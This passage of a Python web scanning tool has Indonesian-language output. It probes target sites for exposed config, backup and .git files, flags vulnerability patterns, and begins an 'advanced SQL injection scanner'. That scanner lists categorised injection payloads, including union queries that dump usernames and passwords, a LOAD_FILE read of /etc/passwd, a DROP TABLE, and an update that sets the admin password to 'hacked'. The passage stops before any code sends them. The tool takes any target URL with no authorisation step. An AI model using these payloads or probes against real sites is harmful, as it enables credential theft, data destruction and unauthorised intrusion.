        Enhanced file probing with UI
        """
        print(f"\n{Colors.MAGENTA}{Colors.BOLD}📁 BACKEND FILE EXPLORER{Colors.END}")
        print(f"{Colors.MAGENTA}{Colors.BOLD}" + "─" * 50 + Colors.END)
        
        files_to_probe = {
            '🔧 Configuration': [
                'robots.txt', '.env', 'config.php', 'wp-config.php',
                '.htaccess', 'web.config', 'package.json', 'composer.json'
            ],
            '🔐 Authentication': [
                'admin.php', 'login.php', 'register.php', 'auth.php',
                'dashboard.php', 'panel.php'
            ],
            '⚡ Development': [
                'phpinfo.php', 'info.php', 'debug.php', 'test.php',
                'api.php', 'ajax.php'
            ],
            '🗃️  System': [
                '.git/config', 'backup.zip', 'dump.sql', 'database.sql',
                'uploads/', 'includes/', 'assets/'
            ]
        }
        
        results_table = []
        found_count = 0
        
        for category, files in files_to_probe.items():
            for file in files:
                test_url = urljoin(base_url, file)
                try:
                    response = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    
                    status_color = Colors.RED
                    status_icon = "✗"
                    
                    if response.status_code == 200:
                        status_color = Colors.GREEN
                        status_icon = "✓"
                        found_count += 1
                    elif response.status_code in [301, 302]:
                        status_color = Colors.BLUE
                        status_icon = "↪"
                    elif response.status_code == 403:
                        status_color = Colors.YELLOW
                        status_icon = "⚠"
                    
                    results_table.append([
                        category,
                        file,
                        f"{status_color}{response.status_code}{Colors.END}",
                        f"{status_color}{status_icon}{Colors.END}"
                    ])
                    
                except:
                    results_table.append([
                        category,
                        file,
                        f"{Colors.RED}TIMEOUT{Colors.END}",
                        f"{Colors.RED}✗{Colors.END}"
                    ])
        
        # Display results in pages
        page_size = 15
        for i in range(0, len(results_table), page_size):
            page = results_table[i:i + page_size]
            print(tabulate(page, headers=["Category", "File", "Status", "Result"], tablefmt="grid"))
            
            if i + page_size < len(results_table):
                input(f"\n{Colors.CYAN}Press Enter for next page...{Colors.END}")
        
        print(f"\n{Colors.CYAN}📊 Found {found_count} accessible files{Colors.END}")

    def database_analysis_ui(self, source_code, url):
        """
        Database analysis with SQL table preview
        """
        print(f"\n{Colors.CYAN}{Colors.BOLD}🗃️  DATABASE ANALYSIS & SQL PREVIEW{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}" + "─" * 50 + Colors.END)
        
        # Detect database patterns
        db_patterns = {
            'MySQL': ['mysql_', 'mysqli_', 'SELECT', 'INSERT', 'UPDATE', 'DELETE'],
            'PostgreSQL': ['pg_', 'POSTGRES', 'psql'],
            'SQLite': ['sqlite_', 'SQLite3'],
            'PDO': ['new PDO', 'PDO::']
        }
        
        db_table = []
        
        for db_type, patterns in db_patterns.items():
            detected = []
            for pattern in patterns:
                if pattern.lower() in source_code.lower():
                    detected.append(pattern)
            
            if detected:
                db_table.append([db_type, len(detected), f"{Colors.GREEN}LIKELY{Colors.END}"])
            else:
                db_table.append([db_type, 0, f"{Colors.RED}UNLIKELY{Colors.END}"])
        
        print(tabulate(db_table, headers=["Database", "Patterns", "Status"], tablefmt="grid"))
        
      
        print(f"\n{Colors.YELLOW}{Colors.BOLD}🔍 SQL INJECTION VULNERABILITY CHECK{Colors.END}")
        vuln_patterns = [
            'mysql_query(', 'mysqli_query(', 'query(', 'exec(',
            '$_GET[', '$_POST[', '$_REQUEST['
        ]
        
        vuln_count = 0
        for pattern in vuln_patterns:
            vuln_count += source_code.lower().count(pattern.lower())
        
        if vuln_count > 0:
            print(f"{Colors.RED}🚨 Potential SQLi vulnerabilities: {vuln_count}{Colors.END}")
        else:
            print(f"{Colors.GREEN}✅ No obvious SQLi patterns detected{Colors.END}")
        
     
        print(f"\n{Colors.GREEN}{Colors.BOLD}📊 SAMPLE SQL TABLE STRUCTURES{Colors.END}")
        self.show_sql_table_previews()

    def show_sql_table_previews(self):
        """
        Display common SQL table structures for reference
        """
        common_tables = {
            'users': [
                ['id', 'INT PRIMARY KEY', 'Auto increment'],
                ['username', 'VARCHAR(50)', 'Unique username'],
                ['email', 'VARCHAR(100)', 'User email'],
                ['password', 'VARCHAR(255)', 'Hashed password'],
                ['created_at', 'TIMESTAMP', 'Creation date']
            ],
            'posts': [
                ['id', 'INT PRIMARY KEY', 'Auto increment'],
                ['title', 'VARCHAR(255)', 'Post title'],
                ['content', 'TEXT', 'Post content'],
                ['user_id', 'INT', 'Foreign key to users'],
                ['created_at', 'TIMESTAMP', 'Creation date']
            ],
            'sessions': [
                ['id', 'VARCHAR(128)', 'Session ID'],
                ['user_id', 'INT', 'User reference'],
                ['ip_address', 'VARCHAR(45)', 'User IP'],
                ['user_agent', 'TEXT', 'Browser info'],
                ['last_activity', 'INT', 'Timestamp']
            ]
        }
        
        for table_name, columns in common_tables.items():
            print(f"\n{Colors.CYAN}📋 Table: {table_name}{Colors.END}")
            print(tabulate(columns, headers=["Column", "Type", "Description"], tablefmt="grid"))
        
   
        print(f"\n{Colors.GREEN}{Colors.BOLD}💡 SAMPLE SQL QUERIES{Colors.END}")
        sample_queries = [
            ["SELECT * FROM users WHERE id = 1", "Get user by ID"],
            ["INSERT INTO users (username, email) VALUES (?, ?)", "Safe parameterized query"],
            ["SELECT * FROM posts WHERE user_id = ?", "Get user's posts"],
            ["UPDATE users SET last_login = NOW() WHERE id = ?", "Update user timestamp"]
        ]
        
        print(tabulate(sample_queries, headers=["Query", "Description"], tablefmt="grid"))

    def generate_backend_report(self, url, source_code, headers):
        """
        Generate comprehensive backend analysis report
        """
        print(f"\n{Colors.CYAN}{Colors.BOLD}📄 GENERATING ANALYSIS REPORT{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}" + "─" * 50 + Colors.END)
        
        report_data = [
            ["🌐 Target URL", url],
            ["📅 Analysis Date", self.get_current_time()],
            ["📏 Source Code Size", f"{len(source_code)} characters"],
            ["🔧 Server", headers.get('Server', 'Unknown')],
            ["📝 Content Type", headers.get('Content-Type', 'Unknown')]
        ]
        
        print(tabulate(report_data, tablefmt="grid"))
        
     
        print(f"\n{Colors.YELLOW}{Colors.BOLD}🛡️  SECURITY RECOMMENDATIONS{Colors.END}")
        recommendations = [
            ["1", "Check for exposed .git folders", "HIGH"],
            ["2", "Verify .env file protection", "HIGH"],
            ["3", "Scan for backup files", "MEDIUM"],
            ["4", "Review PHP error reporting", "MEDIUM"],
            ["5", "Check admin panel access", "LOW"]
        ]
        
        print(tabulate(recommendations, headers=["#", "Recommendation", "Priority"], tablefmt="grid"))

  
    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = requests.utils.urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def show_loading(self, message):
        """Show loading animation"""

        print(f"\n{Colors.CYAN}{message}{Colors.END}", end="", flush=True)
        for i in range(3):
            time.sleep(0.5)
            print(f"{Colors.CYAN}.{Colors.END}", end="", flush=True)
        print()

    def get_current_time(self):
        """Get current timestamp"""

        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_source_with_syntax_highlighting(self, source_code):
        """
        Display source code with advanced syntax highlighting
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎨 SOURCE CODE DENGAN SYNTAX HIGHLIGHTING:{Colors.END}")
            
          
            highlighted = source_code
            
            html_tags = re.findall(r'</?\w+[^>]*>', source_code)
            for tag in set(html_tags):
                colored_tag = f"{Colors.YELLOW}{tag}{Colors.END}"
                highlighted = highlighted.replace(tag, colored_tag)
            
       
            html_comments = re.findall(r'<!--.*?-->', source_code, re.DOTALL)
            for comment in set(html_comments):
                colored_comment = f"{Colors.GREEN}{comment}{Colors.END}"
                highlighted = highlighted.replace(comment, colored_comment)
            
      
            script_blocks = re.findall(r'<script[^>]*>.*?</script>', source_code, re.DOTALL | re.IGNORECASE)
            for script in set(script_blocks):
                colored_script = f"{Colors.BLUE}{script}{Colors.END}"
                highlighted = highlighted.replace(script, colored_script)
            
        
            style_blocks = re.findall(r'<style[^>]*>.*?</style>', source_code, re.DOTALL | re.IGNORECASE)
            for style in set(style_blocks):
                colored_style = f"{Colors.MAGENTA}{style}{Colors.END}"
                highlighted = highlighted.replace(style, colored_style)
            
         
            attributes = re.findall(r'\b\w+="[^"]*"', source_code)
            for attr in set(attributes):
                colored_attr = f"{Colors.CYAN}{attr}{Colors.END}"
                highlighted = highlighted.replace(attr, colored_attr)
            
            print(f"{Colors.WHITE}{'-'*80}{Colors.END}")
            lines = highlighted.split('\n')
            for i, line in enumerate(lines[:100]):  
                print(f"{Colors.YELLOW}{i+1:4d}{Colors.END} {line}")
            
            if len(lines) > 100:
                print(f"{Colors.YELLOW}\n... dan {len(lines) - 100} baris lainnya{Colors.END}")
                print(f"{Colors.CYAN}Gunakan opsi 1 untuk melihat source code lengkap{Colors.END}")
            
            print(f"{Colors.WHITE}{'-'*80}{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"Gagal menampilkan dengan syntax highlighting: {str(e)}", "error")
        
            self.display_full_source_code(source_code, "Fallback Display")

    def analyze_javascript_code(self, source_code):
        """
        Analyze JavaScript code in the source
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}📜 ANALISIS JAVASCRIPT:{Colors.END}")
        
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.findall(script_pattern, source_code, re.DOTALL | re.IGNORECASE)
            
            inline_scripts = []
            external_scripts = []
            
        
            external_pattern = r'<script[^>]*src="([^"]*)"[^>]*>'
            external_srcs = re.findall(external_pattern, source_code, re.IGNORECASE)
            
            print(f"{Colors.CYAN}📊 STATISTIK JAVASCRIPT:{Colors.END}")
            print(f"  {Colors.CYAN}•{Colors.END} Jumlah Script Blocks: {len(scripts)}")
            print(f"  {Colors.CYAN}•{Colors.END} External Scripts: {len(external_srcs)}")
            
            if external_srcs:
                print(f"\n{Colors.CYAN}🌐 EXTERNAL JAVASCRIPT FILES:{Colors.END}")
                for src in external_srcs[:10]: 
                    print(f"  {Colors.GREEN}✓{Colors.END} {src}")
                if len(external_srcs) > 10:
                    print(f"  {Colors.YELLOW}... dan {len(external_srcs) - 10} lainnya{Colors.END}")
            
          
            if scripts:
                total_js_chars = sum(len(script) for script in scripts)
                print(f"\n{Colors.CYAN}📝 INLINE JAVASCRIPT:{Colors.END}")
                print(f"  {Colors.CYAN}•{Colors.END} Total Karakter JavaScript: {total_js_chars:,}")
                
             
                js_patterns = {
                    'Event Listeners': ['addEventListener', 'onclick', 'onload', 'onsubmit'],
                    'AJAX Calls': ['XMLHttpRequest', 'fetch', 'axios', 'ajax'],
                    'jQuery': ['$(', 'jQuery', '.ready('],
                    'Console Usage': ['console.log', 'console.error', 'console.debug'],
                    'DOM Manipulation': ['document.getElementById', 'querySelector', 'innerHTML'],
                    'Security Risks': ['eval(', 'setTimeout(', 'setInterval(', 'innerHTML='],
                    'Local Storage': ['localStorage', 'sessionStorage'],
                    'Cookies': ['document.cookie', 'cookie='],
                }
                
                all_js_code = ' '.join(scripts)
                print(f"\n{Colors.CYAN}🔍 POLA JAVASCRIPT:{Colors.END}")
                for pattern_name, patterns in js_patterns.items():
                    found_count = sum(all_js_code.count(pattern) for pattern in patterns)
                    if found_count > 0:
                        status = f"{Colors.YELLOW}⚠" if 'Risk' in pattern_name else f"{Colors.GREEN}✓"
                        print(f"  {status}{Colors.END} {pattern_name}: {found_count} ditemukan")
            
            if not scripts and not external_srcs:
                print(f"  {Colors.RED}✗{Colors.END} Tidak ditemukan JavaScript")
                
        except Exception as e:
            self.print_result("Error", f"Gagal menganalisis JavaScript: {str(e)}", "error")

    def analyze_forms_and_inputs(self, source_code):
        """
        Analyze forms and input fields in the source code
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}📝 ANALISIS FORM & INPUT FIELDS:{Colors.END}")
       
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, source_code, re.DOTALL | re.IGNORECASE)
            
            print(f"{Colors.CYAN}📊 STATISTIK FORM:{Colors.END}")
            print(f"  {Colors.CYAN}•{Colors.END} Jumlah Form: {len(forms)}")
            
            if forms:
                for i, form in enumerate(forms, 1):
                    print(f"\n{Colors.CYAN}🏷️  FORM {i}:{Colors.END}")
                    
               
                    form_tag = re.search(r'<form[^>]*>', form, re.IGNORECASE)
                    if form_tag:
                        form_attrs = form_tag.group()
                 
                        if 'method="post"' in form_attrs.lower():
                            print(f"  {Colors.GREEN}✓{Colors.END} Method: POST")
                        elif 'method="get"' in form_attrs.lower():
                            print(f"  {Colors.YELLOW}⚠{Colors.END} Method: GET")
                        else:
                            print(f"  {Colors.YELLOW}⚠{Colors.END} Method: Tidak spesifik (default GET)")
                    
              
                    input_fields = re.findall(r'<input[^>]*>', form, re.IGNORECASE)
                    print(f"  {Colors.CYAN}•{Colors.END} Input Fields: {len(input_fields)}")
                    
                 
                    input_types = {}
                    for input_field in input_fields:
                        type_match = re.search(r'type="([^"]*)"', input_field, re.IGNORECASE)
                        if type_match:
                            input_type = type_match.group(1).lower()
                            input_types[input_type] = input_types.get(input_type, 0) + 1
                    
                    for input_type, count in input_types.items():
                        if input_type == 'password':
                            print(f"  {Colors.RED}🚨{Colors.END} Password Fields: {count}")
                        elif input_type == 'hidden':
                            print(f"  {Colors.YELLOW}⚠{Colors.END} Hidden Fields: {count}")
                        else:
                            print(f"  {Colors.GREEN}✓{Colors.END} {input_type.title()} Fields: {count}")
            
           
            all_inputs = re.findall(r'<input[^>]*>', source_code, re.IGNORECASE)
            form_inputs = sum(len(re.findall(r'<input[^>]*>', form, re.IGNORECASE)) for form in forms)
            outside_inputs = len(all_inputs) - form_inputs
            
            if outside_inputs > 0:
                print(f"\n{Colors.YELLOW}⚠  PERHATIAN:{Colors.END}")
                print(f"  {Colors.YELLOW}•{Colors.END} Ditemukan {outside_inputs} input field di luar form")
            
            if not forms and not all_inputs:
                print(f"  {Colors.RED}✗{Colors.END} Tidak ditemukan form atau input fields")
                
        except Exception as e:
            self.print_result("Error", f"Gagal menganalisis forms: {str(e)}", "error")

    def extract_all_urls(self, source_code, base_url):
        """
        Extract and analyze all URLs from the source code
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🔗 EKSTRAKSI SEMUA URL:{Colors.END}")
            
            url_patterns = [
                r'href="([^"]*)"',
                r'src="([^"]*)"',
                r'action="([^"]*)"',
                r'url\(["\']?([^"\'\)]*)["\']?\)',
                r'["\'](https?://[^"\']*)["\']'
            ]
            
            all_urls = []
            for pattern in url_patterns:
                matches = re.findall(pattern, source_code, re.IGNORECASE)
                all_urls.extend(matches)
            
        
            all_urls = list(set([url.strip() for url in all_urls if url.strip()]))
            
            print(f"{Colors.CYAN}📊 STATISTIK URL:{Colors.END}")
            print(f"  {Colors.CYAN}•{Colors.END} Total URL Ditemukan: {len(all_urls)}")
            
            if all_urls:
            
                internal_urls = []
                external_urls = []
                relative_urls = []
                
                base_domain = urlparse(base_url).netloc
                
                for url in all_urls:
                    if url.startswith(('http://', 'https://')):
                        if base_domain in url:
                            internal_urls.append(url)
                        else:
                            external_urls.append(url)
                    else:
                        relative_urls.append(url)
                
                print(f"\n{Colors.CYAN}🏠 INTERNAL URLs ({len(internal_urls)}):{Colors.END}")
                for url in internal_urls[:10]:
                    print(f"  {Colors.GREEN}✓{Colors.END} {url}")
                if len(internal_urls) > 10:
                    print(f"  {Colors.YELLOW}... dan {len(internal_urls) - 10} lainnya{Colors.END}")
                
                print(f"\n{Colors.CYAN}🌐 EXTERNAL URLs ({len(external_urls)}):{Colors.END}")
                for url in external_urls[:10]:
                    print(f"  {Colors.BLUE}↗{Colors.END} {url}")
                if len(external_urls) > 10:
                    print(f"  {Colors.YELLOW}... dan {len(external_urls) - 10} lainnya{Colors.END}")
                
                print(f"\n{Colors.CYAN}📂 RELATIVE URLs ({len(relative_urls)}):{Colors.END}")
                for url in relative_urls[:10]:
                    full_url = urljoin(base_url, url)
                    print(f"  {Colors.CYAN}↪{Colors.END} {url} → {full_url}")
                if len(relative_urls) > 10:
                    print(f"  {Colors.YELLOW}... dan {len(relative_urls) - 10} lainnya{Colors.END}")
                
             
                save_choice = input(f"\n{Colors.CYAN}➤ Simpan semua URL ke file? (y/n): {Colors.END}").strip().lower()
                if save_choice == 'y':
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"extracted_urls_{timestamp}.txt"
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(f"URLs extracted from: {base_url}\n")
                        f.write(f"Extracted at: {time.ctime()}\n\n")
                        f.write("INTERNAL URLs:\n")
                        f.write("\n".join(internal_urls))
                        f.write("\n\nEXTERNAL URLs:\n")
                        f.write("\n".join(external_urls))
                        f.write("\n\nRELATIVE URLs:\n")
                        f.write("\n".join(relative_urls))
                    
                    self.print_result("Success", f"URLs disimpan sebagai: {filename}", "success")
            
            else:
                print(f"  {Colors.RED}✗{Colors.END} Tidak ditemukan URL dalam source code")
                
        except Exception as e:
            self.print_result("Error", f"Gagal mengekstrak URLs: {str(e)}", "error")

    def analyze_cookies_and_storage(self, source_code):
        """
        Analyze cookies and local storage usage
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🍪 ANALISIS COOKIES & LOCAL STORAGE:{Colors.END}")

            cookie_patterns = {
                'document.cookie': ['document.cookie'],
                'Cookie Setting': ['setcookie', 'Set-Cookie'],
                'Local Storage': ['localStorage', 'sessionStorage'],
                'Cookie Libraries': ['js-cookie', 'cookie.js'],
            }
            
            found_patterns = {}
            
            for pattern_name, patterns in cookie_patterns.items():
                count = sum(source_code.count(pattern) for pattern in patterns)
                if count > 0:
                    found_patterns[pattern_name] = count
            
            if found_patterns:
                print(f"{Colors.CYAN}🔍 POLA COOKIES & STORAGE:{Colors.END}")
                for pattern_name, count in found_patterns.items():
                    print(f"  {Colors.GREEN}✓{Colors.END} {pattern_name}: {count} ditemukan")
            else:
                print(f"  {Colors.RED}✗{Colors.END} Tidak ditemukan pola cookies atau storage")
            
        
            cookie_name_pattern = r'(?:cookie|setcookie)[\s\w]*["\']([^"\']+)["\']'
            cookie_names = re.findall(cookie_name_pattern, source_code, re.IGNORECASE)
            
            if cookie_names:
                unique_cookie_names = list(set(cookie_names))
                print(f"\n{Colors.CYAN}🏷️  NAMA COOKIE YANG DITEMUKAN:{Colors.END}")
                for name in unique_cookie_names[:10]:
                    print(f"  {Colors.YELLOW}⚠{Colors.END} {name}")
                if len(unique_cookie_names) > 10:
                    print(f"  {Colors.YELLOW}... dan {len(unique_cookie_names) - 10} lainnya{Colors.END}")
            
       
            sensitive_patterns = [
                'token', 'auth', 'password', 'secret', 'key',
                'session', 'user', 'login', 'credential'
            ]
            
            sensitive_found = []
            for pattern in sensitive_patterns:
                if pattern in source_code.lower():
                    sensitive_found.append(pattern)
            
            if sensitive_found:
                print(f"\n{Colors.RED}🚨 DATA SENSITIVE DITEMUKAN:{Colors.END}")
                for item in sensitive_found:
                    print(f"  {Colors.RED}•{Colors.END} {item}")
                
        except Exception as e:
            self.print_result("Error", f"Gagal menganalisis cookies: {str(e)}", "error")

    def detect_vulnerability_patterns(self, source_code):
        """
        Detect common vulnerability patterns in source code
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🔍 DETEKSI POLA VULNERABILITY:{Colors.END}")
            
            vulnerabilities = {
                'XSS Risks': [
                    'innerHTML', 'outerHTML', 'document.write',
                    'eval(', 'setTimeout(', 'setInterval('
                ],
                'SQL Injection Risks': [
                    'mysql_query', 'mysqli_query', 'SELECT *',
                    'INSERT INTO', 'mysql_connect'
                ],
                'Hardcoded Credentials': [
                    'password=', 'username=', 'api_key=',
                    'secret=', 'token='
                ],
                'Unvalidated Inputs': [
                    '$_GET', '$_POST', '$_REQUEST',
                    'document.URL', 'location.hash'
                ],
                'Insecure Communications': [
                    'http://', 'ftp://', 'ws://',
                    'xmlhttp.open("GET"'
                ],
                'Information Disclosure': [
                    'phpinfo()', 'var_dump(', 'print_r(',
                    'console.log', 'alert('
                ]
            }
            
            found_vulns = {}
            
            for vuln_type, patterns in vulnerabilities.items():
                found_count = 0
                found_items = []
                
                for pattern in patterns:
                    count = source_code.count(pattern)
                    if count > 0:
                        found_count += count
                        found_items.append(f"{pattern} ({count}x)")
                
                if found_count > 0:
                    found_vulns[vuln_type] = {
                        'count': found_count,
                        'items': found_items
                    }
            
            if found_vulns:
                print(f"{Colors.RED}🚨 VULNERABILITY PATTERNS DITEMUKAN:{Colors.END}")
                for vuln_type, data in found_vulns.items():
                    print(f"\n{Colors.RED}• {vuln_type}:{Colors.END}")
                    for item in data['items'][:3]:  
                        print(f"  {Colors.YELLOW}⚠{Colors.END} {item}")
                    if len(data['items']) > 3:
                        print(f"  {Colors.YELLOW}... dan {len(data['items']) - 3} lainnya{Colors.END}")
            else:
                print(f"  {Colors.GREEN}✓{Colors.END} Tidak ditemukan pola vulnerability yang jelas")
            
         
            if found_vulns:
                print(f"\n{Colors.CYAN}🛡️  REKOMENDASI KEAMANAN:{Colors.END}")
                if 'XSS Risks' in found_vulns:
                    print(f"  {Colors.YELLOW}•{Colors.END} Gunakan textContent daripada innerHTML")
                    print(f"  {Colors.YELLOW}•{Colors.END} Validasi dan sanitasi input pengguna")
                
                if 'SQL Injection Risks' in found_vulns:
                    print(f"  {Colors.YELLOW}•{Colors.END} Gunakan prepared statements")
                    print(f"  {Colors.YELLOW}•{Colors.END} Hindari concatenation pada query SQL")
                
                if 'Hardcoded Credentials' in found_vulns:
                    print(f"  {Colors.YELLOW}•{Colors.END} Jangan hardcode credentials di source code")
                    print(f"  {Colors.YELLOW}•{Colors.END} Gunakan environment variables")
                
        except Exception as e:
            self.print_result("Error", f"Gagal mendeteksi vulnerability patterns: {str(e)}", "error")

    def search_keywords_in_source(self, source_code):
        """
        Search for keywords in source code with advanced options
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🔍 PENCARIAN KATA KUNCI:{Colors.END}")
            
            keyword = input(f"{Colors.CYAN}➤ Masukkan kata kunci yang dicari: {Colors.END}").strip()
            
            if not keyword:
                self.print_result("Error", "Kata kunci tidak boleh kosong!", "error")
                return
            
            case_sensitive = input(f"{Colors.CYAN}➤ Case sensitive? (y/n): {Colors.END}").strip().lower() == 'y'
            
            lines = source_code.split('\n')
            matches = []
            
            for line_num, line in enumerate(lines, 1):
                if case_sensitive:
                    if keyword in line:
                        matches.append((line_num, line.strip()))
                else:
                    if keyword.lower() in line.lower():
                        matches.append((line_num, line.strip()))
            
            if matches:
                print(f"\n{Colors.GREEN}✓ Ditemukan {len(matches)} kemunculan '{keyword}'{Colors.END}")
                
            
                context_lines = 2
                displayed_lines = set()
                
                for line_num, line in matches[:20]:  
                    print(f"\n{Colors.CYAN}📄 Baris {line_num}:{Colors.END}")
                    
                 
                    start_line = max(1, line_num - context_lines)
                    end_line = min(len(lines), line_num + context_lines)
                    
                    for ctx_line_num in range(start_line, end_line + 1):
                        if ctx_line_num not in displayed_lines:
                            ctx_line = lines[ctx_line_num - 1].strip()
                            if ctx_line_num == line_num:
                             
                                highlighted_line = ctx_line.replace(
                                    keyword, 
                                    f"{Colors.RED}{Colors.BOLD}{keyword}{Colors.END}"
                                )
                                print(f"{Colors.YELLOW}{ctx_line_num:4d} ▶{Colors.END} {highlighted_line}")
                            else:
                                print(f"{Colors.CYAN}{ctx_line_num:4d}  {Colors.END} {ctx_line}")
                            displayed_lines.add(ctx_line_num)
                
                if len(matches) > 20:
                    print(f"\n{Colors.YELLOW}... dan {len(matches) - 20} hasil lainnya{Colors.END}")
                    
           
                save_choice = input(f"\n{Colors.CYAN}➤ Simpan hasil pencarian ke file? (y/n): {Colors.END}").strip().lower()
                if save_choice == 'y':
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"search_results_{keyword}_{timestamp}.txt"
                    
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(f"Search results for: '{keyword}'\n")
                        f.write(f"Search time: {time.ctime()}\n")
                        f.write(f"Total matches: {len(matches)}\n\n")
                        
                        for line_num, line in matches:
                            f.write(f"Line {line_num}: {line}\n")
                    
                    self.print_result("Success", f"Hasil pencarian disimpan sebagai: {filename}", "success")
                    
            else:
                self.print_result("Info", f"Kata kunci '{keyword}' tidak ditemukan", "info")
                
        except Exception as e:
            self.print_result("Error", f"Gagal melakukan pencarian: {str(e)}", "error")

    def display_full_source_code(self, source_code, url):
        """Display full source code with pagination"""
        print(f"\n{Colors.GREEN}{Colors.BOLD}📄 SOURCE CODE LENGKAP:{Colors.END}")
        print(f"{Colors.CYAN}URL: {url}{Colors.END}")
        print(f"{Colors.WHITE}{'='*80}{Colors.END}")
        
        lines = source_code.split('\n')
        current_line = 0
        page_size = 50
        
        while current_line < len(lines):
            print(f"\n{Colors.CYAN}--- Lines {current_line + 1}-{min(current_line + page_size, len(lines))} of {len(lines)} ---{Colors.END}")
            
            for i in range(current_line, min(current_line + page_size, len(lines))):
                print(f"{Colors.YELLOW}{i+1:4d}{Colors.END} {lines[i]}")
            
            current_line += page_size
            
            if current_line < len(lines):
                cont = input(f"\n{Colors.CYAN}Tekan Enter untuk lanjut, 'q' untuk berhenti: {Colors.END}").strip()
                if cont.lower() == 'q':
                    break

    def save_source_code_to_file(self, source_code, url):
        """Save source code to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        domain = url.split('//')[-1].split('/')[0].replace('.', '_')
        filename = f"source_code_{domain}_{timestamp}.html"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"<!-- Source code for: {url} -->\n")
                f.write(f"<!-- Downloaded at: {time.ctime()} -->\n")
                f.write(source_code)
            
            self.print_result("Success", f"Source code disimpan sebagai: {filename}", "success")
        except Exception as e:
            self.print_result("Error", f"Gagal menyimpan file: {str(e)}", "error")

    def get_target(self):
        self.target_url = input(f"\n{Colors.CYAN}🎯 Masukkan URL target (contoh: https://example.com): {Colors.END}").strip()
        if not self.target_url.startswith(('http://', 'https://')):
            self.target_url = 'https://' + self.target_url

    def check_website_status(self):
        try:
            Animations.loading_animation("Checking website status")
            response = self.session.get(self.target_url, timeout=10)
            server = response.headers.get('Server', 'Tidak diketahui')
            tech = response.headers.get('X-Powered-By', 'Tidak diketahui')
            
            self.print_result("Website Status", f"Online - Status Code: {response.status_code}", "success")
            self.print_result("Server", server, "info")
            self.print_result("Technology", tech, "info")
            self.print_result("Content Size", f"{len(response.content)} bytes", "info")
            return True
        except Exception as e:
            self.print_result("Website Status", f"Offline - {str(e)}", "error")
            return False


    def sql_injection_scan_advanced(self):
        self.banner()
        self.print_banner_section("ADVANCED SQL INJECTION SCANNER")
        
        self.get_target()
        
        if not self.check_website_status():
            input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
            return

        # Klasifikasi payload berdasarkan teknik dan database
        payload_categories = {
            "ERROR_BASED": {
                "name": "Error-Based SQL Injection",
                "payloads": [
                    "'", "\"", "`", 
                    "' OR '1'='1", "\" OR \"1\"=\"1",
                    "' AND 1=1--", "' AND 1=2--",
                    "' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version))--",
                    "' AND UPDATEXML(1,CONCAT(0x3a,@@version),1)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' PROCEDURE ANALYSE()--"
                ]
            },
            "UNION_BASED": {
                "name": "Union-Based SQL Injection", 
                "payloads": [
                    "' UNION SELECT 1--",
                    "' UNION SELECT 1,2--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,@@version,3--",
                    "' UNION SELECT 1,user(),database()--",
                    "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
                    "' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--"
                ]
            },
            "TIME_BASED": {
                "name": "Time-Based Blind SQLi",
                "payloads": [
                    "' AND SLEEP(5)--",
                    "' AND BENCHMARK(1000000,MD5('test'))--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--"
                ]
            },
            "BOOLEAN_BASED": {
                "name": "Boolean-Based Blind SQLi", 
                "payloads": [
                    "' AND 1=1--", "' AND 1=2--",
                    "' AND ASCII(SUBSTRING(@@version,1,1))>0--",
                    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--"
                ]
            },
            "STACKED_QUERIES": {
                "name": "Stacked Queries",
                "payloads": [
                    "'; DROP TABLE test--",
                    "'; CREATE TABLE test(id int)--", 
                    "'; UPDATE users SET password='hacked' WHERE username='admin'--"
                ]
            }
        }

        # Database-specific payloads
        db_specific_payloads = {
            "MySQL": [
                "' AND @@version LIKE '%MySQL%'--",
                "' AND MID(@@version,1,1)='5'--",
                "' AND LOAD_FILE('/etc/passwd')--"
            ],
            "PostgreSQL": [
                "' AND version() LIKE '%PostgreSQL%'--",
                "' AND pg_sleep(5)--"
            ],
            "MSSQL": [
                "' AND @@version LIKE '%Microsoft%'--", 
                "' AND WAITFOR DELAY '0:0:5'--"
            ],
            "Oracle": [
                "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=0--"
            ]
        }

        print(f"\n{Colors.YELLOW}Memulai Advanced SQL Injection Scan...{Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
        
        vulnerable_points = []
        parsed_url = urlparse(self.target_url)
        
        # Ekstrak semua parameter dari URL dan form
        test_points = self.extract_test_points()
        
        total_tests = len(test_points) * sum(len(category["payloads"]) for category in payload_categories.values())
        current_test = 0
        
